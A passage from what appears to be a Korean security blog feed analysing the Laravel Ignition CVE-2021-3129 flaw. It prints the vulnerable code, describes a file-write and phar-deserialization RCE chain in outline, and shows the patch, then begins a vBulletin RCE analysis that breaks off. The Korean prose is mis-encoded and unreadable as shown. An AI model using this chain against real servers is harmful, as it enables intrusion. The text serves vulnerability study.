class="title">Validation</span>\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;run(<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;parameters&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ì»¨íŠ¸ë¡¤ëŸ¬ë¥¼ í™•ì¸í•´ë´…ì‹œë‹¤. <code>ExecuteSolutionController</code> í´ë˜ìŠ¤ë¥¼ í™•ì¸í•´ ë³´ë©´ run() ë©”ì„œë“œë¥¼ ì‹¤í–‰í•˜ê³ , ì¸ì ê°’ìœ¼ë¡œëŠ” parametersë¥¼ ë„˜ê²¨ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. run() ë©”ì„œë“œëŠ” <code>MakeViewVariableOptionalSolution::run()</code>ì— ì •ì˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Solutions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">RunnableSolution</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Blade</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìœ„ ìš”ì²­ í—¤ë”ì—ì„œ sollutionì´ ê°€ë¥´í‚¤ëŠ” <code>MakeViewVariableOptionalSolution</code> í´ë˜ìŠ¤ë¥¼ ë³´ë©´ run() ë©”ì„œë“œì—ì„œ makeOptional() ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆê³ , makeOptional() ë©”ì„œë“œì— ê°’ìœ¼ë¡œ $parametersë¥¼ ê·¸ëŒ€ë¡œ ë„˜ê²¨ì£¼ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. (Facade\Ignition\Solutions\MakeViewVariableOptionalSolution)<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">    <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makeOptional() ë©”ì„œë“œë¥¼ ë³´ë©´ file_get_contents() ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ëŠ” ë° ì´ë•Œ ì…ë ¥ê°’ì¸ <code>viewFile</code>(ì„ì˜ì˜ ê°’ì„ ë„£ì–´ì¤„ ìˆ˜ ìˆìŒ)ë¥¼ ë„˜ê²¨ì£¼ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  <code>$originalContents</code>ì—ì„œ <code>&#39;$&#39;.$parameters[&#39;variableName&#39;]</code>ì„ <code>&#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;</code>ë¡œ replace ì‹œí‚¤ê³ , 2ê°œì˜ ê°’ì„ ì´ìš©í•´ì„œ í† í° 2ê°œë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ìƒì„±ëœ ë‘ê°œì˜ í† í°ì´ ë‹¤ë¥´ falseë¥¼ ë°˜í™˜í•˜ê³ , ê°™ì€ $newContentsë¥¼ ë°˜í™˜í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$newContentsê°€ ë¦¬í„´ì´ ë˜ì—ˆë‹¤ë©´ $newContentsì˜ ê°’ì„ file_put_contents() ë©”ì„œë“œë¥¼ ì´ìš©í•´ì„œ $parameters[â€˜viewFileâ€™]ë¡œ ê°’ì„ ë„£ì–´ íŒŒì¼ì„ ìƒì„±í•˜ê³  . ê°ì´ ì˜¤ì…¨ë‚˜ìš”? ì—¬ê¸°ì„œ file_get_contents(), file_put_contents() ë©”ì„œë“œì˜ ì¸ìê°’ì— ëŒ€í•œ ê²€ì¦ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ ìš°ë¦¬ê°€ ì›í•˜ëŠ” ê°’ì„ ë§ˆìŒëŒ€ë¡œ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br><br></p><p>ì—°êµ¬ì›ì€ ì´ë¥¼ ì´ìš©í•´ì„œ PHP Wrapperì„ ì´ìš©í•´ log íŒŒì¼ì„ ì²´ì´ë‹ ì‹œì¼œ, ë§ˆì§€ë§‰ì— phar Wrapperë¥¼ ì´ìš©í•´ì„œ ì—­ì§ë ¬í™” RCEë¥¼ íŠ¸ë¦¬ê±° í•˜ì˜€ìŠµë‹ˆë‹¤. log íŒŒì¼ì„ ì²´ì´ë‹ í•  ë•ŒëŠ” base64, utf-8, utf-16 ë“±ì„ ì´ìš©í•´ì„œ ì²´ì´ë‹ì„ í•´ì¤€ ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤.<br></p><hr><h2 id="CVE-2021-3129-Patch"><a href="#CVE-2021-3129-Patch" class="headerlink" title="CVE-2021-3129 Patch"></a><em>CVE-2021-3129 Patch</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ignition-2.5.2/ignition-2.5.2/src/Solutions/MakeViewVariableOptionalSolution.php</span></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;isSafePath(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CVE-2021-3129 Patch ë…¸íŠ¸ê°€ ë”°ë¡œ ì¡´ì¬í•˜ì§€ ì•Šì•„ íŒ¨ì¹˜ ë²„ì „ì¸ Ignition 2.5.2ì˜ ì½”ë“œë¥¼ ì§ì ‘ í™•ì¸í•´ë³´ì•˜ìŠµë‹ˆë‹¤. <code>makeOptional()</code> ë©”ì„œë“œë¥¼ ë³´ë©´ ê¸°ì¡´ì—ëŠ” ì¡´ì¬í•˜ì§€ ì•Šë˜ <code>$parameters[&#39;viewFile&#39;]</code>ì˜ ê°’ì„ <code>isSafePath()</code> ë©”ì„œë“œë¥¼ ì´ìš©í•´ì„œ ê²€ì¦í•˜ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSafePath()</code> ë©”ì„œë“œë¥¼ ë³´ë©´ â€˜/â€˜, â€˜./â€˜ë¡œ ì‹œì‘í•˜ì§€ ì•Šê±°ë‚˜, ë§ˆì§€ë§‰ì— .blade.phpê°€ ì•„ë‹ˆë©´ falseë¥¼ ë¦¬í„´í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìœ„ 2ê°œì˜ ê²€ì¦ ë¡œì§ì´ ì¶”ê°€ë˜ë¯€ë¡œ í•­ìƒ viewFileì˜ ê°’ì´ <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>ì¼ ë•Œ ì •ìƒ ì‘ë™í•˜ê²Œ ë˜ì—ˆê³ , ê°œë°œìê°€ ì˜ë„í•˜ì§€ ì•Šì€ ê°’ì´ <code>viewFile</code>ë¡œ ë“¤ì–´ì˜¤ê²Œ ë˜ë©´ ì•„ë¬´ ì¼ë„ ì¼ì–´ë‚˜ì§€ ì•Šê²Œ ë˜ë©° CVE-2021-3129 ì·¨ì•½ì ì„ íŒ¨ì¹˜í•˜ì˜€ìŠµë‹ˆë‹¤.<br></p><p>ë§¤ë²ˆ ëŠë¼ì§€ë§Œ PHPì—ì„œëŠ” ëŠì„ ì—†ì´ ì·¨ì•½ì ì´ ë‚˜ì˜¤ê³  ìˆë„¤ìš”. ì•ìœ¼ë¡œë„ PHPë¥¼ ì‚¬ìš©í•˜ê³  ìˆëŠ” ì›¹ í”„ë ˆì„ì›Œí¬ë‚˜ ì—¬ëŸ¬ í”„ë¡œê·¸ë¨ì—ì„œ ì·¨ì•½ì ì´ ë” ìˆ˜ë‘ë£© ë‚˜ì˜¬ ê±° ê°™ìŠµë‹ˆë‹¤.<br></p><hr>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0-day RCE in vBulletin</title>
      <link href="2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"/>
      <url>2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/</url>
      
        <content type="html"><![CDATA[<p>vBulletinì—ì„œ ë°œê²¬ëœ 0-day ì·¨ì•½ì ì„ ë¶„ì„í•´ë³´ê² ìŠµë‹ˆë‹¤. vBulletinì€ ì™¸êµ­ì—ì„œ ì‚¬ìš©í•˜ëŠ” í¬ëŸ¼ íˆ´ì´ë¼ê³  í•©ë‹ˆë‹¤. í•œêµ­ ë§ë¡œ í’€ì–´ ì“°ë©´ í† ë¡ í˜• ê²Œì‹œíŒì´ë¼ê³  ë³¼ ìˆ˜ ìˆê² ìŠµë‹ˆë‹¤. ì—¬í•˜íŠ¼ ì´ í¬ëŸ¼ íˆ´ì—ì„œ RCE ì·¨ì•½ì ì´ ì´ 2ë²ˆ ë°œê²¬ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-16759</td><td>5.x ~ 5.5.4</td><td>9.8</td></tr><tr><td>CVE-2020-7373</td><td>5.5.4 ~ 5.6.2</td><td>9.8</td></tr></tbody></table><p>ì²˜ìŒì—ëŠ” <code>CVE-2019-16759</code>ë¼ëŠ” ì·¨ì•½ì ì´ ë‚˜ì™”ì—ˆê³ , ì·¨ì•½í•œ ë²„ì „ì€ 5.xë¶€í„° 5.5.4ê¹Œì§€ë¼ê³  í•©ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ 9ì›” 24ì¼ì— ì²˜ìŒ POCê°€ ê³µê°œë˜ì—ˆê³ , ë°”ë¡œ ë‹¤ìŒ ë‚ ì¸ 25ì¼ì— íŒ¨ì¹˜ê°€ ëë‹¤ê³  í•©ë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ ì™„ì „íˆ íŒ¨ì¹˜ëœ ì¤„ ì•Œì•˜ë˜ 0-day ì·¨ì•½ì ì´ í•œ ë³´ì•ˆ ì—°êµ¬ì›ì— ì˜í•´ì„œ ë˜ ë‹¤ì‹œ ëš«ë¦¬ê³  ë§ì•˜ìŠµë‹ˆë‹¤. <code>CVE-2020-7373</code>ë¼ëŠ” CVE IDë¡œ ë‚˜ì™”ì—ˆê³ , ì·¨ì•½í•œ ë²„ì „ì€ 5.5.4ë¶€í„° 5.6.2ê¹Œì§€ë¼ê³  í•©ë‹ˆë‹¤. ê·¸ëŸ¼ í•œ ë²ˆ RCEê°€ ì–´ë–»ê²Œ íŠ¸ë¦¬ê±° ëëŠ”ì§€ ì½”ë“œ ë¶„ì„ì„ í†µí•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤.</p><hr><h2 id="CVE-2019-16759"><a href="#CVE-2019-16759" class="headerlink" title="CVE-2019-16759"></a>CVE-2019-16759</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line"><span class="comment">//For a few set routes we can run a streamlined funcction.</span></span><br><span class="line"><span class="keyword">if</span> (vB5_Frontend_ApplicationLight::isQuickRoute())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$app</span> = vB5_Frontend_ApplicationLight::init(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$app</span>-&gt;execute())</span><br><span class="line">    &#123;</span><br><span class="line">        <span 